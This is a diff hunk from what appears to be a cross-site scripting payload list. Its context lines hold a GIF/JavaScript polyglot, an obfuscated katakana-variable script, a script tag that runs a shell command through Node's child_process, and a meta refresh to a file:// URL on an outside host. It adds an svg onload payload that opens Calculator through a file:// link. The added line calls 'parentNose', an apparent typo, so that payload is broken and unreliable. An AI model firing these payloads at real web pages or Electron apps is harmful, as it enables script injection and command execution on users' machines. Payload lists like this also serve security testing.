@@ -1705,3 +1705,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 ([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
 <script>top.require('child_process').execSync('open -a Calculator')</script>
 <meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
+<a href="file:///Applications/Calculator.app"><svg onload="this.parentNose.click()"></a>
